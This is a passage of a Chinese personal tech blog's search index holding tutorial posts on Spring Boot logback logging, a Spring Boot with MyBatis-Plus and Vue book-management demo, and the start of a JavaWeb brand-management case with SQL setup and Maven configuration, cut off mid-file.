Base64.getEncoder().encodeToString(msg.getBytes()); &#125; //解密 public static String decode(String msg)&#123; return new String(Base64.getDecoder().decode(msg)); &#125; &#125; ​ logback日志添加xml文件在springboot项目的resource目录下创建logback-spring.xml文件 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;appender name=&quot;stdout&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder&gt; &lt;springProfile name=&quot;dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=&quot;!dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=&quot;timeFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;log/log-%d&#123;yyyy-MM-dd-HH&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;stdout&quot;/&gt; &lt;appender-ref ref=&quot;timeFile&quot;/&gt; &lt;/root&gt; &lt;/configuration&gt; 在sercie实现类创建Logger对象，输⼊⽇志 日志会被记录到项目的/log目录下，且是按每日记录 log/log-%d&#123;yyyy-MM-dd-HH&#125;.log","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springboot_demo","date":"2022-04-17T13:32:46.000Z","path":"2022/04/17/springboot-demo/","text":"springboot demo使用springboot整合SSMP 1.项目需求项目最终实现的页面 ​ 整体案例中需要采用的技术如下： Dao开发————整合MyBatisPlus，制作数据层测试 Service开发————基于MyBatisPlus进行增量开发，制作业务层测试类 Controller开发————基于Restful开发，使用PostMan测试接口功能 Controller开发————前后端开发协议制作 页面开发————基于VUE+ElementUI制作，前后端联调，页面数据处理，页面消息处理 列表 新增 修改 删除 分页 查询 项目异常处理 按条件查询————页面功能调整、Controller修正功能、Service修正功能 2.创建springboot的web项目新建模块File-&gt;new-&gt;module 这里没什么需要改的，只需要修改使用的java版本 选择所需要的依赖，选择后springboot就可以自动导入相关坐标，无需手动导入 ==注意将配置文件改为yml类型== application.yml # 修改配置将tomcat的端口改为80 server: port: 80 3.开发流程实体类开发数据库资源 -- ---------------------------- -- Table structure for tbl_book -- ---------------------------- DROP TABLE IF EXISTS `tbl_book`; CREATE TABLE `tbl_book` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 51 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic; -- ---------------------------- -- Records of tbl_book -- ---------------------------- INSERT INTO `tbl_book` VALUES (1, &#x27;计算机理论&#x27;, &#x27;Spring实战 第5版&#x27;, &#x27;Spring入门经典教程，深入理解Spring原理技术内幕&#x27;); INSERT INTO `tbl_book` VALUES (2, &#x27;计算机理论&#x27;, &#x27;Spring 5核心原理与30个类手写实战&#x27;, &#x27;十年沉淀之作，手写Spring精华思想&#x27;); INSERT INTO `tbl_book` VALUES (3, &#x27;计算机理论&#x27;, &#x27;Spring 5 设计模式&#x27;, &#x27;深入Spring源码剖析Spring源码中蕴含的10大设计模式&#x27;); INSERT INTO `tbl_book` VALUES (4, &#x27;计算机理论&#x27;, &#x27;Spring MVC+MyBatis开发从入门到项目实战&#x27;, &#x27;全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手&#x27;); INSERT INTO `tbl_book` VALUES (5, &#x27;计算机理论&#x27;, &#x27;轻量级Java Web企业应用实战&#x27;, &#x27;源码级剖析Spring框架，适合已掌握Java基础的读者&#x27;); INSERT INTO `tbl_book` VALUES (6, &#x27;计算机理论&#x27;, &#x27;Java核心技术 卷I 基础知识（原书第11版）&#x27;, &#x27;Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新&#x27;); INSERT INTO `tbl_book` VALUES (7, &#x27;计算机理论&#x27;, &#x27;深入理解Java虚拟机&#x27;, &#x27;5个维度全面剖析JVM，大厂面试知识点全覆盖&#x27;); INSERT INTO `tbl_book` VALUES (8, &#x27;计算机理论&#x27;, &#x27;Java编程思想（第4版）&#x27;, &#x27;Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉&#x27;); INSERT INTO `tbl_book` VALUES (9, &#x27;计算机理论&#x27;, &#x27;零基础学Java（全彩版）&#x27;, &#x27;零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术&#x27;); INSERT INTO `tbl_book` VALUES (10, &#x27;市场营销&#x27;, &#x27;直播就该这么做：主播高效沟通实战指南&#x27;, &#x27;李子柒、李佳琦、薇娅成长为网红的秘密都在书中&#x27;); INSERT INTO `tbl_book` VALUES (11, &#x27;市场营销&#x27;, &#x27;直播销讲实战一本通&#x27;, &#x27;和秋叶一起学系列网络营销书籍&#x27;); INSERT INTO `tbl_book` VALUES (12, &#x27;市场营销&#x27;, &#x27;直播带货：淘宝、天猫直播从新手到高手&#x27;, &#x27;一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+&#x27;); tbl_book对应的实体类如下 import lombok.Data; @Data // Data注解可以可以完成所有属性的setter getter toString，equals，hashCode方法 public class Book &#123; private Integer id; private String type; private String name; private String description; &#125; 为了方便开发使用lombok注解，在pom.xml添加坐标 &lt;dependencies&gt; &lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 数据层开发-CRUD(1) 导入mybatisplus、数据源、mysql驱动的坐标&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; (2)在application.xml中配置数据源信息 spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC username: root password: root ==若连接数据库出现时区错误时可以加上参数?serverTimezone=UTC== (3)使用MyBatisPlus的标准通用接口BaseMapper加速开发@Mapper public interface BookDao extends BaseMapper&lt;Book&gt; &#123; &#125; ==注意== 对数据库操作时需要指定数据表的前缀，并设置主键增加的策略，这里使用自增 mybatis-plus: global-config: db-config: table-prefix: tbl_ #设置表名通用前缀 id-type: auto #设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增 设置mybatisPlus的日志显示格式 在进行数据层测试的时候，因为基础的CRUD操作均由MyBatisPlus给我们提供了，所以就出现了一个局面，开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你开发出来的，所以查看执行期运行的SQL语句就成为当务之急。 可以添加日志配置 mybatis-plus: global-config: db-config: table-prefix: tbl_ id-type: auto configuration: # 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 数据层开发-分页功能Mybatis-plus中已经实现了分页功能的API，具体使用方法如下 创建Page对象，利用构造方法实例化所需的参数currentPage，pageSize 使用Mapper.selectPage()使用分页查询功能 IPage page = new Page(2,5); IPage page = bookDao.selectPage(page, null); 使用分页查询返回的结果仍是Page类型，其中包含多条数据，并且使用返回的结果可以获取到分页的详细信息，包括当前页，总记录数，当前页记录数，前一页等 @Test void testGetPage()&#123; IPage page = new Page(2,5); bookDao.selectPage(page, null); System.out.println(page.getCurrent()); //当前页码值 System.out.println(page.getSize()); //每页显示数 System.out.println(page.getTotal()); //数据总量 System.out.println(page.getPages()); //总页数 System.out.println(page.getRecords()); //详细数据 &#125; 但是在使用分页功能时需要设置一个拦截器，基础操作中有查询全部的功能，而在这个基础上只需要升级一下（PLUS）就可以得到分页操作。所以MyBatisPlus将分页操作做成了一个开关，你用分页功能就把开关开启，不用就不需要开启这个开关。而我们现在没有开启这个开关，所以分页操作是没有的。这个开关是通过MyBatisPlus的拦截器的形式存在的。 @Configuration public class MPConfig &#123; @Bean public MybatisPlusInterceptor mybatisPlusInterceptor()&#123; MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor()); // 当需要其他的拦截器时继续addInnerInterceptor即可 // 如果后期开发其他功能，需要添加全新的拦截器，按照第二行的格式继续add进去新的拦截器就可以了。 return interceptor; &#125; &#125; 数据层开发-条件查询MyBatisPlus将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种条件的拼装。使用方法如下 @Test void testGetBy()&#123; QueryWrapper&lt;Book&gt; qw = new QueryWrapper&lt;&gt;(); qw.like(&quot;name&quot;,&quot;Spring&quot;); bookDao.selectList(qw); &#125; 其中第一句QueryWrapper对象是一个用于封装查询条件的对象，该对象可以动态使用API调用的方法添加条件，最终转化成对应的SQL语句。第二句就是一个条件了，需要什么条件，使用QueryWapper对象直接调用对应操作即可。上述代码中执行的SQL语句为select * from tbl_book where name like &#39;%spring%&#39;，MP自动对查询条件进行处理，省去了手动处理的一步。 MyBatisPlus针对字段检查进行了功能升级，全面支持Lambda表达式，就有了下面这组API。由QueryWrapper对象升级为LambdaQueryWrapper对象，其使用方法如下： @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); lqw.like(Book::getName,name); bookDao.selectList(lqw); &#125; 为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MyBatisPlus还提供了动态拼装SQL的快捷书写方式。 @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); //if(name != null) lqw.like(Book::getName,name); //方式一：JAVA代码控制 lqw.like(name != null,Book::getName,name); //方式二：API接口提供控制开关 bookDao.selectList(lqw); &#125; 业务层开发定义业务层的接口BookService package com.sunzy.service; import com.baomidou.mybatisplus.core.metadata.IPage; import com.sunzy.domain.Book; import java.util.List; public interface BookService &#123; boolean save(Book book); boolean update(Book book); boolean delete(Integer id); List&lt;Book&gt; getAll(); Book getById(Integer id); IPage&lt;Book&gt; getPage(int currentPage, int pageSize); &#125; 业务层接口的实现类 package com.sunzy.service.impl; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.dao.BookDao; import com.sunzy.domain.Book; import com.sunzy.service.BookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; // 注册为数据逻辑层的bean @Service public class BookServiceImpl2 implements BookService &#123; @Autowired private BookDao bookDao; @Override public boolean save(Book book) &#123; return bookDao.insert(book) &gt; 0; &#125; @Override public boolean update(Book book) &#123; return bookDao.updateById(book) &gt; 0; &#125; @Override public boolean delete(Integer id) &#123; return bookDao.deleteById(id) &gt; 0; &#125; @Override public List&lt;Book&gt; getAll() &#123; return bookDao.selectList(null); &#125; @Override public Book getById(Integer id) &#123; return bookDao.selectById(id); &#125; @Override public IPage&lt;Book&gt; getPage(int currentPage, int pageSize) &#123; IPage&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return bookDao.selectPage(page, null); &#125; &#125; 使用mybatisplus的自带接口快速开发 业务层接口快速开发 public interface IBookService extends IService&lt;Book&gt; &#123; //添加非通用操作API接口 &#125; ​ 业务层接口实现类快速开发，关注继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类。 @Service public class BookServiceImpl extends ServiceImpl&lt;BookDao, Book&gt; implements IBookService &#123; @Autowired private BookDao bookDao; //添加非通用操作API &#125; ​ 如果感觉MyBatisPlus提供的功能不足以支撑你的使用需要（其实是一定不能支撑的，因为需求不可能是通用的），在原始接口基础上接着定义新的API接口就行了，此处不再说太多了，就是自定义自己的操作了，但是不要和已有的API接口名冲突即可。 总结 使用通用接口（ISerivce）快速开发Service 使用通用实现类（ServiceImpl&lt;M,T&gt;）快速开发ServiceImpl 可以在通用接口基础上做功能重载或功能追加 注意重载时不要覆盖原始操作，避免原始提供的功能丢失 表现层开发表现层接口如下： package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.*; import java.util.List; //使用restful接口约束 @RestController @RequestMapping(&quot;/books&quot;) public class BookController2 &#123; @Autowired private IBookService service; @GetMapping public List&lt;Book&gt; getAll()&#123; return service.list(); &#125; @PostMapping public boolean save(@RequestBody Book book)&#123; System.out.println(book); return service.save(book); &#125; @PutMapping public boolean update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return service.update(book,wrapper); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public boolean delete(@PathVariable int id)&#123; return service.removeById(id); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public Book getById(@PathVariable int id )&#123; return service.getById(id); &#125; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public IPage&lt;Book&gt; getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; Page&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return service.page(page); &#125; &#125; 使用postman测试各个接口是否可以正常工作 getById功能 分页功能 save()功能 删除功能delete() ==消息一致性处理== @Data public class R &#123; private Boolean flag; //表示本次请求是否成功 private Object data; //本次请求返回的数据 &#125; 使用消息一致处理后获取的数据格式 &#123; &quot;flag&quot;: true, &quot;data&quot;:&#123; &quot;id&quot;: 1, &quot;type&quot;: &quot;计算机理论&quot;, &quot;name&quot;: &quot;Spring实战 第5版&quot;, &quot;description&quot;: &quot;Spring入门经典教程&quot; &#125; &#125; 修改表现层代码 package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.controller.utils.R; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import java.util.List; @RestController @RequestMapping(&quot;/books&quot;) public class BookController &#123; @Autowired private IBookService service; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public R getAll(@PathVariable int currentPage, @PathVariable int pageSize, Book book)&#123; IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book); if(currentPage &gt; bookIPage.getPages()) &#123; bookIPage = service.getAll((int) bookIPage.getPages(), pageSize, book); &#125; return new R(null != bookIPage, bookIPage); &#125; @PostMapping public R save(@RequestBody Book book)&#123; return new R(service.save(book)); &#125; @PutMapping public R update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return new R(service.update(book,wrapper)); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public R delete(@PathVariable int id)&#123; return new R(service.removeById(id)); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public R getById(@PathVariable int id )&#123; return new R(true, service.getById(id)); &#125; // @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) // public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; // Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize); // Page&lt;Book&gt; page = service.page(ipage); // // if(currentPage &gt; page.getCurrent())&#123; // ipage.setCurrent(page.getPages()); // page = service.page(ipage); // &#125; // return new R(true, page); // &#125; &#125; 前端页面代码分页查询所有数据和条件查询页面数据模型定义 data:&#123; dataList: [], //当前页要展示的列表数据 pagination: &#123; //分页相关模型数据 currentPage: 1,//当前页码 pageSize:10, //每页显示的记录数 total:0, //总记录数 name:&#x27;&#x27;, type:&#x27;&#x27;, description:&#x27;&#x27; &#125; &#125; 异步请求代码 getAll() &#123; param = &quot;?name=&quot; + this.pagination.name; param = param + &quot;&amp;type=&quot; + this.pagination.type; param = param + &quot;&amp;description=&quot; + this.pagination.description; // console.log(param); axios.get(&quot;/books/&quot;+this.pagination.currentPage + &quot;/&quot; + this.pagination.pageSize + param).then((res)=&gt;&#123; this.dataList = res.data.data.records; this.pagination.total = res.data.data.total; this.pagination.currentPage = res.data.data.current; this.pagination.pagesize = res.data.data.size; &#125;); &#125; 在钩子函数中执行该方法 //钩子函数，VUE对象初始化完成后自动执行 created() &#123; this.getAll(); &#125;, 添加数据添加数据的窗口弹出控制 数据模型 dialogFormVisible: false,//添加表单是否可见 formData 对话框控制函数 //弹出添加窗口 handleCreate() &#123; this.dialogFormVisible = true; this.resetForm(); &#125;, 重置表单功能 //重置表单 resetForm() &#123; this.formData = &#123;&#125;; &#125;, 添加功能 handleAdd () &#123; axios.post(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible = false; this.$message.success(&quot;添加成功！&quot;); &#125;else&#123; this.$message.error(&quot;添加失败！&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125; 删除数据// 删除 handleDelete(row) &#123; axios.delete(&quot;/books/&quot; + row.id).then((res)=&gt;&#123; if(res.data.flag)&#123; this.$message.success(&quot;删除成功！&quot;); this.getAll(); &#125;else&#123; this.$message.error(&quot;删除失败！&quot;); &#125; &#125;) &#125;, 修改数据//弹出编辑窗口 handleUpdate(row) &#123; this.dialogFormVisible4Edit = true; this.formData = row; &#125;, //修改 handleEdit() &#123; axios.put(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible4Edit = false; this.$message.success(&quot;修改成功！&quot;); &#125;else&#123; this.$message.error(&quot;修改失败！&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125;,","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"javaweb","date":"2022-03-30T05:08:56.000Z","path":"2022/03/30/javaweb/","text":"Javaweb基础项目学完 javaweb 做的小项目 综合案例需求与准备今日目标： 能够完成查询所有功能 能够完成添加功能 能够理解 BaseServlet 思想 能够完成批量删除功能 能够完成分页查询功能 能够完成条件查询功能 1，功能介绍 以上是我们在综合案例要实现的功能。对数据的除了对数据的增删改查功能外，还有一些复杂的功能，如 批量删除、分页查询、条件查询 等功能 批量删除 功能：每条数据前都有复选框，当我选中多条数据并点击 批量删除 按钮后，会发送请求到后端并删除数据库中指定的多条数据。 分页查询 功能：当数据库中有很多数据时，我们不可能将所有的数据展示在一页里，这个时候就需要分页展示数据。 条件查询 功能：数据库量大的时候，我们就需要精确的查询一些想看到的数据，这个时候就需要通过条件查询。 这里的 修改品牌 和 删除品牌 功能在课程上不做讲解，留作同学来下的练习。 2，环境准备环境准备我们主要完成以下两件事即可 将资料的 brand-case 模块导入到 idea中 执行资料中提供的 tb_brand.sql脚本 在没有资料的情况下在idea中创建maven的web项目可以使用下面的方法 file -&gt; new -&gt; module-&gt;Maven-&gt;Create from archetype-&gt;maven archetype-&gt;next 2.1 工程准备将 04-资料\\01-初始工程 中的 brand-case 工程导入到我们自己的 idea 中。工程结构如下： 2.2 创建表下面是创建表的语句 -- 删除tb_brand表 drop table if exists tb_brand; -- 创建tb_brand表 create table tb_brand ( -- id 主键 id int primary key auto_increment, -- 品牌名称 brand_name varchar(20), -- 企业名称 company_name varchar(20), -- 排序字段 ordered int, -- 描述信息 description varchar(100), -- 状态：0：禁用 1：启用 status int ); -- 添加数据 insert into tb_brand (brand_name, company_name, ordered, description, status) values (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1); 2.3 配置信息mybatis将mybatis的配置文件mybatis-config.xmlcopy到src/main/resource目录下 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt; &lt;configuration&gt; &lt;typeAliases&gt; &lt;package name=&quot;com.itheima.pojo&quot;/&gt; &lt;/typeAliases&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;!-- 配置数据名 javastudy 用户名和密码--&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///javastudy?useSSL=false&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;!--扫描mapper 这里根据项目的mapper目录配置--&gt; &lt;package name=&quot;com.itheima.mapper&quot;/&gt; &lt;/mappers&gt; &lt;/configuration&gt; mavenpom.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;brand-case&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!--web项目将打包成war格式 普通项目则为jar --&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!--Servlet--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!--MyBatis依赖--&gt; 